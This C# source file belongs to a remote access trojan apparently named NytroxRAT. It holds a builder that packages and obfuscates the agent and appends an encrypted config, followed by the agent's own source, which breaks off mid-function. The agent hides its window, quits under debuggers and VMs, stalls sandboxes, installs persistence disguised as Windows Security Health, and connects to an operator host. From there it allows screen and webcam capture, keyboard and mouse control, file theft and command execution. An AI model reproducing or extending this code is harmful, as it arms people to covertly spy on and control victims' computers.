using System.IO;
using System.Security;
using System.Text;

namespace NytroxRAT.Client;

/// <summary>
/// Builds a standalone agent EXE from source using dotnet publish + ConfuserEx.
/// Pipeline: compile → single-file publish → ConfuserEx obfuscation on the EXE.
/// ConfuserEx is applied AFTER single-file packaging so nothing gets recompiled.
/// </summary>
public static class AgentBuilder
{
    public class BuildResult
    {
        public bool         Success    { get; set; }
        public string       Message    { get; set; } = "";
        public long         OutputSize { get; set; }
        public List<string> Warnings   { get; set; } = new();
    }

    public static BuildResult Build(string ip, string port, string secret, string outputExePath,
                                    string proxyHost = "", string proxyPort = "", bool hideIp = false, bool useWss = false,
                                    string installFolder = "", string persistenceKey = "", string? iconPath = null)
    {
        if (string.IsNullOrWhiteSpace(ip))                                 return Fail("IP cannot be empty.");
        if (string.IsNullOrWhiteSpace(port) || !int.TryParse(port, out _)) return Fail("Port must be a number.");
        if (string.IsNullOrWhiteSpace(secret))                             return Fail("Secret cannot be empty.");

        var installedExeName = Path.GetFileName(outputExePath);
        if (string.IsNullOrWhiteSpace(installedExeName)) return Fail("Invalid output file name.");

        if (string.IsNullOrWhiteSpace(installFolder))
            installFolder = @"Microsoft\Windows\SecurityHealth";
        if (string.IsNullOrWhiteSpace(persistenceKey))
            persistenceKey = "WindowsSecurityHealth";

        // Build config JSON — encrypt before appending so it's not plaintext in the EXE
        var config    = System.Text.Json.JsonSerializer.Serialize(new
        {
            ip, port, secret, proxyHost, proxyPort, hideIp, useWss,
            installFolder,
            persistenceKey,
            installedExeName
        });
        var configEnc = EncryptConfig(System.Text.Encoding.UTF8.GetBytes(config));
        // Marker is XOR-obfuscated so it's not a plaintext string signature in the builder either
        var marker    = new byte[] { 0x4E^0xAA,0x58^0xAA,0x54^0xAA,0x52^0xAA,0x4F^0xAA,0x58^0xAA,
                                     0x5F^0xAA,0x43^0xAA,0x46^0xAA,0x47^0xAA,0x32^0xAA,0x3A^0xAA }
                        .Select(b => (byte)(b ^ 0xAA)).ToArray(); // "NYTROX_CFG2:"
        var configBlock = marker.Concat(configEnc).ToArray();

        // ── Path 1: Embedded stub (no SDK needed) ──────────────────────
        // Custom icon requires recompile — stub has baked-in icon
        var stubBytes = ExtractEmbeddedStub();
        if (!string.IsNullOrWhiteSpace(iconPath) && File.Exists(iconPath))
            stubBytes = null;
        if (stubBytes != null)
        {
            try
            {
                if (File.Exists(outputExePath)) File.Delete(outputExePath);
                // Write stub + appended config
                using var fs = File.OpenWrite(outputExePath);
                fs.Write(stubBytes, 0, stubBytes.Length);
                fs.Write(configBlock, 0, configBlock.Length);
                fs.Close();

                var size = new FileInfo(outputExePath).Length;
                return new BuildResult
                {
                    Success    = true,
                    Message    = $"✓ Agent built — no SDK required.\n\n" +
                                 $"Output : {outputExePath}\n" +
                                 $"Size   : {size / 1024 / 1024:F1} MB\n" +
                                 $"Target : {(useWss ? "wss" : "ws")}://{ip}:{port}\n\n" +
                                 $"Single EXE — no .NET runtime needed on target.",
                    OutputSize = size
                };
            }
            catch (Exception ex) { return Fail($"Failed to write agent: {ex.Message}"); }
        }

        // ── Path 2: dotnet publish fallback (SDK required) ─────────────
        var tempDir = Path.Combine(Path.GetTempPath(), $"NytroxBuild_{Guid.NewGuid():N}");
        try
        {
            Directory.CreateDirectory(tempDir);

            File.WriteAllText(Path.Combine(tempDir, "Program.cs"),
                AgentSource.GetSource());

            var useIcon = !string.IsNullOrWhiteSpace(iconPath) && File.Exists(iconPath);
            if (useIcon)
            {
                var destIco = Path.Combine(tempDir, "agent.ico");
                File.Copy(iconPath!, destIco, overwrite: true);
            }

            var iconXml = useIcon ? "\n    <ApplicationIcon>agent.ico</ApplicationIcon>" : "";
            var asmId = SanitizeAssemblyName(Path.GetFileNameWithoutExtension(outputExePath));
            var rawTitle = Path.GetFileNameWithoutExtension(outputExePath);
            if (string.IsNullOrEmpty(rawTitle)) rawTitle = asmId;
            var productXml = SecurityElement.Escape(rawTitle) ?? rawTitle;
            File.WriteAllText(Path.Combine(tempDir, "Agent.csproj"), $"""
                <Project Sdk="Microsoft.NET.Sdk">
                  <PropertyGroup>
                    <OutputType>WinExe</OutputType>
                    <TargetFramework>net9.0-windows</TargetFramework>
                    <AssemblyName>{asmId}</AssemblyName>
                    <RootNamespace>{asmId}</RootNamespace>
                    <Product>{productXml}</Product>
                    <AssemblyTitle>{productXml}</AssemblyTitle>
                    <Description>{productXml}</Description>
                    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
                    <Nullable>enable</Nullable>
                    <ImplicitUsings>disable</ImplicitUsings>
                    <Optimize>true</Optimize>
                    <SelfContained>true</SelfContained>
                    <RuntimeIdentifier>win-x64</RuntimeIdentifier>
                    <PublishSingleFile>true</PublishSingleFile>
                    <EnableCompressionInSingleFile>true</EnableCompressionInSingleFile>
                    <DebugType>none</DebugType>
                    <DebugSymbols>false</DebugSymbols>
                    <UseWindowsForms>false</UseWindowsForms>{iconXml}
                  </PropertyGroup>
                  <ItemGroup>
                    <PackageReference Include="Microsoft.Win32.Registry" Version="5.0.0" />
                  </ItemGroup>
                {(useIcon ? """
                  <ItemGroup>
                    <None Include="agent.ico" />
                  </ItemGroup>
                """ : "")}
                </Project>
                """);

            var publishDir = Path.Combine(tempDir, "publish");
            var build = RunProcess("dotnet",
                $"publish Agent.csproj -c Release -r win-x64 --self-contained true " +
                $"-p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true " +
                $"-p:DebugType=none -p:DebugSymbols=false " +
                $"-o \"{publishDir}\" --nologo -v quiet",
                tempDir);

            if (!build.Success)
                return Fail($"Build failed (no embedded stub, SDK compile also failed):\n{build.Error}");

            var builtExe = Directory.GetFiles(publishDir, "*.exe")
                .FirstOrDefault(f => !f.EndsWith(".pdb"));

            if (builtExe == null)
                return Fail("No EXE found in publish output.");

            // Append config to the compiled EXE
            if (File.Exists(outputExePath)) File.Delete(outputExePath);
            using (var fs = File.OpenWrite(outputExePath))
            {
                var exeBytes = File.ReadAllBytes(builtExe);
                fs.Write(exeBytes, 0, exeBytes.Length);
                fs.Write(configBlock, 0, configBlock.Length);
            }

            // Optional ConfuserEx obfuscation
            bool obfuscated = false;
            var confuser = FindConfuserEx();
            if (confuser != null)
            {
                var obfDir  = Path.Combine(tempDir, "obf");
                Directory.CreateDirectory(obfDir);
                var crproj  = Path.Combine(tempDir, "agent.crproj");
                File.WriteAllText(crproj, $"""
                    <project outputDir="{obfDir}" baseDir="{publishDir}" xmlns="http://confuser.codeplex.com">
                      <rule pattern="true" preset="normal" inherit="false">
                        <protection id="rename" />
                        <protection id="constants" />
                        <protection id="ctrl flow" />
                        <protection id="ref proxy" />
                      </rule>
                      <module path="{outputExePath}" />
                    </project>
                    """);
                var obfResult = RunProcess(confuser, $"-n \"{crproj}\"", tempDir);
                var obfExe    = Path.Combine(obfDir, Path.GetFileName(outputExePath));
                if (obfResult.Success && File.Exists(obfExe))
                { File.Copy(obfExe, outputExePath, true); obfuscated = true; }
            }

            var size = new FileInfo(outputExePath).Length;
            return new BuildResult
            {
                Success    = true,
                Message    = $"✓ Agent built via SDK{(obfuscated ? " + obfuscated" : "")}.\n\n" +
                             $"Output : {outputExePath}\n" +
                             $"Size   : {size / 1024 / 1024:F1} MB\n" +
                             $"Target : {(useWss ? "wss" : "ws")}://{ip}:{port}\n\n" +
                             $"Single EXE — no .NET runtime needed on target.\n" +
                             "⚠ Tip: build the solution once to embed the stub — future builds won't need the SDK.",
                OutputSize = size
            };
        }
        catch (Exception ex) { return Fail($"Build error: {ex.Message}"); }
        finally { try { Directory.Delete(tempDir, true); } catch { } }
    }

    private static byte[]? ExtractEmbeddedStub()
    {
        try
        {
            var asm = System.Reflection.Assembly.GetExecutingAssembly();
            using var stream = asm.GetManifestResourceStream("agent_stub.exe");
            if (stream == null) return null;
            var buf = new byte[stream.Length];
            var total = 0;
            while (total < buf.Length)
            {
                var n = stream.Read(buf, total, buf.Length - total);
                if (n == 0) return null;
                total += n;
            }
            return buf;
        }
        catch { return null; }
    }

    // ── ConfuserEx ─────────────────────────────────────────────────────────
    private static string? _extractedConfuserPath;

    private static string? FindConfuserEx()
    {
        if (_extractedConfuserPath != null && File.Exists(_extractedConfuserPath))
            return _extractedConfuserPath;

        var clientDir = AppDomain.CurrentDomain.BaseDirectory;
        var candidates = new[]
        {
            Path.Combine(clientDir, "Confuser.CLI.exe"),
            Path.Combine(clientDir, @"..\..\..\Confuser.CLI.exe"),
            Path.Combine(clientDir, @"..\..\..\..\Confuser.CLI.exe"),
            Path.Combine(clientDir, @"..\..\..\ConfuserEx\Confuser.CLI.exe"),
            Path.Combine(clientDir, @"..\..\..\..\ConfuserEx\Confuser.CLI.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),    "ConfuserEx", "Confuser.CLI.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "ConfuserEx", "Confuser.CLI.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),     "ConfuserEx", "Confuser.CLI.exe"),
        };

        var found = candidates.Select(Path.GetFullPath).FirstOrDefault(File.Exists);
        if (found != null) return found;

        // Extract from embedded resources (single-file publish scenario)
        var extracted = TryExtractEmbeddedConfuserEx();
        if (extracted != null) { _extractedConfuserPath = extracted; return extracted; }

        return null;
    }

    private static string? TryExtractEmbeddedConfuserEx()
    {
        try
        {
            var asm       = System.Reflection.Assembly.GetExecutingAssembly();
            var resources = asm.GetManifestResourceNames();
            if (!resources.Any(r => r.Contains("Confuser.CLI"))) return null;

            var extractDir = Path.Combine(Path.GetTempPath(), "NytroxConfuser");
            Directory.CreateDirectory(extractDir);

            var files = new[]
            {
                "Confuser.CLI.exe", "Confuser.CLI.exe.config",
                "Confuser.Core.dll", "Confuser.DynCipher.dll",
                "Confuser.Protections.dll", "Confuser.Renamer.dll", "Confuser.Runtime.dll",
            };

            foreach (var file in files)
            {
                var resName = resources.FirstOrDefault(r =>
                    r.EndsWith(file, StringComparison.OrdinalIgnoreCase));
                if (resName == null) continue;
                var dest = Path.Combine(extractDir, file);
                if (File.Exists(dest)) continue;
                using var stream = asm.GetManifestResourceStream(resName)!;
                using var fs     = File.Create(dest);
                stream.CopyTo(fs);
            }

            var cli = Path.Combine(extractDir, "Confuser.CLI.exe");
            return File.Exists(cli) ? cli : null;
        }
        catch { return null; }
    }

    // ── Process helpers ────────────────────────────────────────────────────
    private static (bool Success, string Error, int ExitCode) RunProcess(string exe, string args, string workDir)
    {
        try
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName               = exe,
                Arguments              = args,
                WorkingDirectory       = workDir,
                UseShellExecute        = false,
                CreateNoWindow         = true,
                RedirectStandardOutput = true,
                RedirectStandardError  = true
            };
            using var proc = System.Diagnostics.Process.Start(psi)!;
            var stdout = proc.StandardOutput.ReadToEnd();
            var stderr = proc.StandardError.ReadToEnd();
            proc.WaitForExit(120_000);
            return (proc.ExitCode == 0, stderr + stdout, proc.ExitCode);
        }
        catch (Exception ex) { return (false, ex.Message, -1); }
    }

    private static BuildResult Fail(string m) => new() { Success = false, Message = m };

    /// <summary>MSBuild assembly name: letters, digits, underscore; must not start with a digit.</summary>
    private static string SanitizeAssemblyName(string? baseName)
    {
        if (string.IsNullOrWhiteSpace(baseName)) return "HostApp";
        var sb = new StringBuilder();
        foreach (var c in baseName.Trim())
        {
            if (char.IsLetterOrDigit(c) || c == '_') sb.Append(c);
            else if (c is '-' or '.' or ' ') sb.Append('_');
        }
        var s = sb.ToString().Trim('_');
        if (string.IsNullOrEmpty(s)) s = "HostApp";
        if (char.IsDigit(s[0])) s = "App_" + s;
        if (s.Length > 60) s = s[..60];
        return s;
    }

    // AES-256-GCM encrypt config block — key derived from fixed seed so agent can decrypt without SDK
    private static byte[] EncryptConfig(byte[] data)
    {
        // Key derived from a fixed seed — obfuscated, not stored as plaintext
        var seedBytes = new byte[] { 0x4E,0x79,0x74,0x72,0x6F,0x78,0x52,0x41,0x54,0x2E,0x73,0x65,0x65,0x64,0x2E,0x76,
                                     0x31,0x2E,0x30,0x2E,0x73,0x61,0x6C,0x74,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38 };
        using var kdf   = new System.Security.Cryptography.Rfc2898DeriveBytes(seedBytes, seedBytes.Reverse().ToArray(), 10000, System.Security.Cryptography.HashAlgorithmName.SHA256);
        var key         = kdf.GetBytes(32);
        var nonce       = System.Security.Cryptography.RandomNumberGenerator.GetBytes(12);
        var cipher      = new byte[data.Length];
        var tag         = new byte[16];
        using var aes   = new System.Security.Cryptography.AesGcm(key, 16);
        aes.Encrypt(nonce, data, cipher, tag);
        // Layout: [12 nonce][16 tag][cipher]
        return nonce.Concat(tag).Concat(cipher).ToArray();
    }
}

// ── Agent source code — all functionality in one self-contained file ───────
// ── Agent source — plain raw string, values injected via Replace ─────────
internal static class AgentSource
{
    public static string GetSource()
    {
        return SourceTemplate;
    }

    private const string SourceTemplate = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

// ── Anti-analysis: kill if debugger/VM detected ───────────────────────────
static class Guard
{
    public static void Check()
    {
        // Hide console window immediately — first thing that runs
        try { var h = GetConsoleWindow(); if (h != IntPtr.Zero) ShowWindow(h, 0); } catch {}

        // Anti-debug
        if (IsDebuggerPresent()) Environment.Exit(0);
        try { if (System.Diagnostics.Debugger.IsAttached) Environment.Exit(0); } catch {}

        // Anti-VM: check for common VM artifacts in process list and registry
        try
        {
            var procs = System.Diagnostics.Process.GetProcesses();
            // XOR-encoded VM process names to avoid plaintext strings
            var vmProcs = new[] {
                Deobf(new byte[]{0x72,0x6D,0x77,0x61,0x72,0x65,0x74,0x72,0x61,0x79}),   // vmwaretray
                Deobf(new byte[]{0x76,0x6D,0x77,0x61,0x72,0x65,0x75,0x73,0x65,0x72}),   // vmwareuser
                Deobf(new byte[]{0x76,0x62,0x6F,0x78,0x73,0x65,0x72,0x76,0x69,0x63,0x65}), // vboxservice
                Deobf(new byte[]{0x76,0x62,0x6F,0x78,0x74,0x72,0x61,0x79}),             // vboxtray
                Deobf(new byte[]{0x76,0x6D,0x74,0x6F,0x6F,0x6C,0x73,0x64}),             // vmtoolsd
                Deobf(new byte[]{0x78,0x65,0x6E,0x73,0x65,0x72,0x76,0x69,0x63,0x65}),   // xenservice
            };
            foreach (var p in procs)
                if (vmProcs.Any(v => p.ProcessName.ToLower().Contains(v)))
                    Environment.Exit(0);
        }
        catch {}

        // Anti-sandbox: if running <3 min since boot, likely a sandbox snapshot
        try { if (Environment.TickCount64 < 180_000) { Thread.Sleep(180_000 - (int)Environment.TickCount64); } } catch {}

        // Anti-sandbox: check for minimum screen resolution (sandboxes often use 800x600)
        try {
            var w = GetSystemMetrics(0);
            var h = GetSystemMetrics(1);
            if (w < 1024 || h < 600) { Thread.Sleep(30000); Environment.Exit(0); }
        } catch {}
    }

    // Deobfuscate byte array to string — avoids plaintext strings in IL
    static string Deobf(byte[] b) => Encoding.ASCII.GetString(b);

    [DllImport(""kernel32.dll"")] static extern bool   IsDebuggerPresent();
    [DllImport(""kernel32.dll"")] static extern IntPtr GetConsoleWindow();
    [DllImport(""user32.dll"")]   static extern bool   ShowWindow(IntPtr h, int n);
    [DllImport(""user32.dll"")]   static extern int    GetSystemMetrics(int i);
}

// ── String obfuscation helper ─────────────────────────────────────────────
static class S
{
    // XOR key for string deobfuscation — split across multiple fields to avoid patterns
    private static readonly byte[] _k1 = { 0xDE,0xAD };
    private static readonly byte[] _k2 = { 0xBE,0xEF };
    private static byte[] Key => _k1.Concat(_k2).ToArray();

    public static string D(byte[] b)
    {
        var k = Key;
        var r = new byte[b.Length];
        for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ k[i % k.Length]);
        return Encoding.UTF8.GetString(r);
    }
}

// ── Settings — reads AES-encrypted config appended to this EXE ───────────
static class Settings
{
    private static readonly Lazy<AgentConfig> _cfg = new(() =>
    {
        // Single-file publish extracts to %TEMP%\.net\<hash>\ at runtime.
        // We need to find the ORIGINAL exe on disk, not the temp extraction copy.
        var candidates = new List<string?>();

        // Best source for single-file: the original command line argument
        try { candidates.Add(Environment.GetCommandLineArgs().FirstOrDefault()); } catch {}
        // ProcessPath is reliable on .NET 6+
        try { candidates.Add(Environment.ProcessPath); } catch {}
        // Walk up from AppContext looking for non-temp exe
        try {
            var dir = AppContext.BaseDirectory;
            for (int i = 0; i < 4; i++) {
                var exes = Directory.GetFiles(dir, ""*.exe"");
                foreach (var e in exes)
                    if (!e.Contains(""Temp"") && !e.Contains("".net"")) candidates.Add(e);
                dir = Path.GetDirectoryName(dir) ?? dir;
            }
        } catch {}
        try { candidates.Add(System.Diagnostics.Process.GetCurrentProcess().MainModule?.FileName); } catch {}

        foreach (var path in candidates.Where(p => !string.IsNullOrEmpty(p) && File.Exists(p)))
        {
            try
            {
                var bytes  = File.ReadAllBytes(path!);
                var marker = new byte[] { 0x4E,0x59,0x54,0x52,0x4F,0x58,0x5F,0x43,0x46,0x47,0x32,0x3A };
                int scanStart = Math.Max(0, bytes.Length - 131072);
                for (int i = bytes.Length - marker.Length - 28; i >= scanStart; i--)
                {
                    bool match = true;
                    for (int j = 0; j < marker.Length; j++)
                        if (bytes[i + j] != marker[j]) { match = false; break; }
                    if (!match) continue;
                    var blob = bytes.Skip(i + marker.Length).ToArray();
                    var json = DecryptConfig(blob);
                    if (json == null) continue;
                    var cfg = JsonSerializer.Deserialize<AgentConfig>(json);
                    if (cfg != null) return cfg;
                }
            }
            catch { }
        }
        return new AgentConfig();
    });

    static byte[]? DecryptConfig(byte[] blob)
    {
        try
        {
            if (blob.Length < 28) return null;
            var seedBytes = new byte[] { 0x4E,0x79,0x74,0x72,0x6F,0x78,0x52,0x41,0x54,0x2E,0x73,0x65,0x65,0x64,0x2E,0x76,
                                         0x31,0x2E,0x30,0x2E,0x73,0x61,0x6C,0x74,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38 };
            using var kdf = new Rfc2898DeriveBytes(seedBytes, seedBytes.Reverse().ToArray(), 10000, HashAlgorithmName.SHA256);
            var key   = kdf.GetBytes(32);
            var nonce = blob[..12]; var tag = blob[12..28]; var cipher = blob[28..];
            var plain = new byte[cipher.Length];
            using var aes = new AesGcm(key, 16);
            aes.Decrypt(nonce, cipher, tag, plain);
            return plain;
        }
        catch { return null; }
    }

    public static string Ip        => _cfg.Value.Ip;
    public static string Port      => _cfg.Value.Port;
    public static string Secret    => _cfg.Value.Secret;
    public static string ProxyHost => _cfg.Value.ProxyHost;
    public static string ProxyPort => _cfg.Value.ProxyPort;
    public static bool   HideIp    => _cfg.Value.HideIp;
    public static bool   UseWss    => _cfg.Value.UseWss;
    public static string PersistenceKey => string.IsNullOrWhiteSpace(_cfg.Value.PersistenceKeyName) ? ""WindowsSecurityHealth"" : _cfg.Value.PersistenceKeyName.Trim();
    public static string InstallFolder  => string.IsNullOrWhiteSpace(_cfg.Value.InstallFolder) ? ""Microsoft\\Windows\\SecurityHealth"" : _cfg.Value.InstallFolder.Trim();
    public static string InstallExeName   => NormalizeExeName(_cfg.Value.InstalledExeName);
    static string NormalizeExeName(string? n)
    {
        if (string.IsNullOrWhiteSpace(n)) return ""RuntimeHost.exe"";
        n = n.Trim();
        if (!n.EndsWith("".exe"", StringComparison.OrdinalIgnoreCase)) n += "".exe"";
        return n;
    }
    public static string Url       => (UseWss ? S.D(new byte[]{0xA9,0xDE,0xCD,0xD5,0xF1,0x82}) : S.D(new byte[]{0xA9,0xDE,0x84,0xC0,0xF1})) + Ip + "":"" + Port;
    public static bool   UseProxy  => !string.IsNullOrEmpty(ProxyHost) && !string.IsNullOrEmpty(ProxyPort);
}

class AgentConfig
{
    [JsonPropertyName(""ip"")]        public string Ip        { get; set; } = ""127.0.0.1"";
    [JsonPropertyName(""port"")]      public string Port      { get; set; } = ""9000"";
    [JsonPropertyName(""secret"")]    public string Secret    { get; set; } = ""changeme"";
    [JsonPropertyName(""proxyHost"")] public string ProxyHost { get; set; } = """";
    [JsonPropertyName(""proxyPort"")] public string ProxyPort { get; set; } = """";
    [JsonPropertyName(""hideIp"")]    public bool   HideIp    { get; set; } = false;
    [JsonPropertyName(""useWss"")]    public bool   UseWss    { get; set; } = false;
    [JsonPropertyName(""installFolder"")]   public string InstallFolder { get; set; } = ""Microsoft\\Windows\\SecurityHealth"";
    [JsonPropertyName(""persistenceKey"")] public string PersistenceKeyName { get; set; } = ""WindowsSecurityHealth"";
    [JsonPropertyName(""installedExeName"")] public string InstalledExeName { get; set; } = ""SecurityHealthHost.exe"";
}

class Program
{
    [System.STAThread]
    static async Task Main()
    {
        // Hide console window immediately — first thing that runs
        try { var h = GetConsoleWindow(); if (h != IntPtr.Zero) ShowWindow(h, 0); } catch {}

        // Anti-debug / anti-VM / anti-sandbox checks
        Guard.Check();

        Persistence.Install();
        var key = PacketCrypto.DeriveKey(Settings.Secret);
        var ct  = new CancellationTokenSource().Token;
        while (true)
        {
            try
            {
                using var ws = new ClientWebSocket();

                // Large send/receive buffers — reduces per-frame overhead
                ws.Options.SetBuffer(20 * 1024 * 1024, 20 * 1024 * 1024);

                // Avoid system HTTP proxy for ws:// — it often blocks direct LAN connections
                ws.Options.Proxy = null;

                ws.Options.SetRequestHeader(""X-No-Delay"", ""1"");
                if (Settings.HideIp)
                    ws.Options.SetRequestHeader(""X-Hide-Ip"", ""1"");

                // Keep alive so connection doesn't drop on idle
                ws.Options.KeepAliveInterval = TimeSpan.FromSeconds(15);

                // Accept self-signed cert when using WSS
                if (Settings.UseWss)
                {
                    ws.Options.RemoteCertificateValidationCallback =
                        (sender, cert, chain, errors) => true;
                }

                // Route through SOCKS5 proxy if configured (hides operator IP)
                if (Settings.UseProxy)
                {
                    ws.Options.Proxy = new System.Net.WebProxy($""socks5://{Settings.ProxyHost}:{Settings.ProxyPort}"");
                }

                await ws.ConnectAsync(new Uri(Settings.Url), ct);

                // Send semaphore — ClientWebSocket does NOT allow concurrent sends
                // StatsLoop + Handle both call Send, so this prevents the race that kills the connection
                var sendLock = new SemaphoreSlim(1, 1);

                // Send stats immediately so client shows hostname right away
                try { await SafeSend(ws, Enc(new Packet { Type = PktType.SystemStats, Payload = Json(GetStats()) }, key), sendLock, ct); } catch {}

                _ = StatsLoop(ws, key, sendLock, ct);
                while (ws.State == WebSocketState.Open)
                {
                    var pkt = await Recv(ws, ct);
                    if (pkt == null) break;
                    Decrypt(pkt, key);
                    // Fire-and-forget so slow ops (screen capture, file ops) don't block the receive loop
                    _ = Handle(ws, pkt, key, sendLock, ct);
                }
            }
            catch { }
            await Task.Delay(5000);
        }
    }

    static async Task Handle(ClientWebSocket ws, Packet p, byte[] key, SemaphoreSlim sendLock, CancellationToken ct)
    {
        switch (p.Type)
        {
            case PktType.ScreenRequest:
                // Run capture on thread pool so it doesn't block
                var frame = await Task.Run(() => CaptureScreen());
                await SafeSend(ws, Enc(new Packet { Type = PktType.ScreenFrame, Payload = Json(frame) }, key), sendLock, ct); break;
            case PktType.MouseMove:
                var mm = From<MouseMovePayload>(p); MoveMouse(mm.X, mm.Y); break;
            case PktType.MouseClick:
                var mc = From<MouseClickPayload>(p); ClickMouse(mc.X, mc.Y, mc.Button, mc.IsDown); break;
            case PktType.KeyPress:
                var kp = From<KeyPressPayload>(p); KeyEvent(kp.VirtualKey, kp.IsDown); break;
            case PktType.FileListRequest:
                await SafeSend(ws, Enc(new Packet { Type = PktType.FileListResponse, Payload = Json(ListDir(From<FileListRequest>(p).Path)) }, key), sendLock, ct); break;
            case PktType.FileDownloadRequest:
                await SafeSend(ws, Enc(new Packet { Type = PktType.FileDownloadResponse, Payload = Json(DownloadFile(From<FileDownloadRequest>(p).Path)) }, key), sendLock, ct); break;
            case PktType.FileUploadRequest:
                await SafeSend(ws, Enc(new Packet { Type = PktType.FileUploadResponse, Payload = Json(UploadFile(From<FileUploadRequest>(p))) }, key), sendLock, ct); break;
            case PktType.FileDeleteRequest:
                await SafeSend(ws, Enc(new Packet { Type = PktType.FileDeleteResponse, Payload = Json(DeletePath(From<FileDeleteRequest>(p).Path)) }, key), sendLock, ct); break;
            case PktType.CommandExecute:
                await RunCommand(ws, From<CommandExecutePayload>(p).Command, key, sendLock, ct); break;
            case PktType.ProcessList:
                await SafeSend(ws, Enc(new Packet { Type = PktType.ProcessList, Payload = Json(GetProcesses()) }, key), sendLock, ct); break;
            case PktType.WebcamListRequest:
                await SafeSend(ws, Enc(new Packet { Type = PktType.WebcamListResponse, Payload = Json(WebcamCapture.ListDevices()) }, key), sendLock, ct); break;
            case PktType.WebcamRequest:
                var wcReq = From<WebcamRequestPayload>(p);
                _ = WebcamLoop(ws, wcReq.CameraIndex, key, sendLock, ct); break;
            case PktType.WebcamStop:
                WebcamCapture.Stop(); break;
        }
    }

    static async Task StatsLoop(ClientWebSocket ws, byte[] key, SemaphoreSlim sendLock, CancellationToken ct)
    {
        while (ws.State == WebSocketState.Open)
        {
            try
            {
                await Task.Delay(3000, ct);
                if (ws.State == WebSocketState.Open)
                    await SafeSend(ws, Enc(new Packet { Type = PktType.SystemStats, Payload = Json(GetStats()) }, key), sendLock, ct);
            }
            catch { break; }
        }
    }

    // Thread-safe send — uses semaphore to prevent concurrent sends crashing ClientWebSocket
    static async Task SafeSend(ClientWebSocket ws, Packet p, SemaphoreSlim lck, CancellationToken ct)
    {
        if (ws.State != WebSocketState.Open) return;
        await lck.WaitAsync(ct);
        try
        {
            if (ws.State == WebSocketState.Open)
                await ws.SendAsync(JsonSerializer.SerializeToUtf8Bytes(p), WebSocketMessageType.Text, true, ct);
        }
        finally { lck.Release(); }
    }

    // ── Screen capture — 25% scale BMP, fast and reliable ────────────────
    static ScreenFramePayload CaptureScreen()
    {
        int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
        int w  = sw / 4; // 25% scale — very small, fast to transfer
        int h  = sh / 4;

        IntPtr hdcScreen = GetDC(IntPtr.Zero);
        IntPtr hdcMem    = CreateCompatibleDC(hdcScreen);
        IntPtr hBitmap   = CreateCompatibleBitmap(hdcScreen, w, h);
        IntPtr hOld      = SelectObject(hdcMem, hBitmap);
        SetStretchBltMode(hdcMem, 4); // STRETCH_HALFTONE
        StretchBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, sw, sh, 0x00CC0020);

        var bmi = new BITMAPINFOHEADER { biSize=(uint)Marshal.SizeOf<BITMAPINFOHEADER>(), biWidth=w, biHeight=-h, biPlanes=1, biBitCount=24 };
        int stride = ((w * 3 + 3) & ~3);
        var pixels = new byte[stride * h];
        GetDIBits(hdcMem, hBitmap, 0, (uint)h, pixels, ref bmi, 0);
        SelectObject(hdcMem, hOld);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(IntPtr.Zero, hdcScreen);

        using var ms = new MemoryStream(stride * h + 54);
        int fileSize = 54 + stride * h;
        ms.Write(new byte[]{0x42,0x4D}); ms.Write(BitConverter.GetBytes(fileSize));
        ms.Write(new byte[4]); ms.Write(BitConverter.GetBytes(54));
        ms.Write(BitConverter.GetBytes(40)); ms.Write(BitConverter.GetBytes(w));
        ms.Write(BitConverter.GetBytes(h));
        ms.Write(BitConverter.GetBytes((short)1)); ms.Write(BitConverter.GetBytes((short)24));
        ms.Write(new byte[24]);
        for (int row = h-1; row >= 0; row--) ms.Write(pixels, row*stride, stride);

        return new ScreenFramePayload { Width=w, Height=h, ImageBase64=Convert.ToBase64String(ms.ToArray()), Format=""bmp"" };
    }

    static void MoveMouse(int x, int y)
    {
        int sw=GetSystemMetrics(0), sh=GetSystemMetrics(1);
        int nx=(int)((double)x/sw*65535), ny=(int)((double)y/sh*65535);
        var inp = new INPUT { type=0, u=new InputUnion { mi=new MOUSEINPUT { dx=nx, dy=ny, dwFlags=0x0001|0x8000|0x4000 } } };
        SendInput(1, ref inp, Marshal.SizeOf<INPUT>());
    }
    static void ClickMouse(int x, int y, int btn, bool down)
    {
        MoveMouse(x, y);
        uint f = btn == 0 ? (down?0x0002u:0x0004u) : btn == 1 ? (down?0x0008u:0x0010u) : (down?0x0020u:0x0040u);
        var inp = new INPUT { type=0, u=new InputUnion { mi=new MOUSEINPUT { dwFlags=f } } };
        SendInput(1, ref inp, Marshal.SizeOf<INPUT>());
    }
    static void KeyEvent(int vk, bool down)
    {
        var inp = new INPUT { type=1, u=new InputUnion { ki=new KEYBDINPUT { wVk=(ushort)vk, dwFlags=down?0u:0x0002u } } };
        SendInput(1, ref inp, Marshal.SizeOf<INPUT>());
    }

    static FileListResponse ListDir(string path)
    {
        try
        {
            var info = new DirectoryInfo(path);
            var entries = new List<FileEntry>();
            foreach (var d in info.GetDirectories()) try { entries.Add(new FileEntry { Name=d.Name, FullPath=d.FullName, IsDirectory=true, LastModified=d.LastWriteTime }); } catch {}
            foreach (var f in info.GetFiles())       try { entries.Add(new FileEntry { Name=f.Name, FullPath=f.FullName, Size=f.Length, LastModified=f.LastWriteTime }); } catch {}
            return new FileListResponse { Path=path, Entries=entries };
        }
        catch (Exception ex) { return new FileListResponse { Path=path, Error=ex.Message }; }
    }
    static FileDownloadResponse DownloadFile(string path)
    {
        try
        {
            var info = new FileInfo(path);
            if (info.Length > 50*1024*1024) return new FileDownloadResponse { Path=path, Error=""File too large (>50MB)"" };
            return new FileDownloadResponse { Path=path, DataBase64=Convert.ToBase64String(File.ReadAllBytes(path)) };
        }
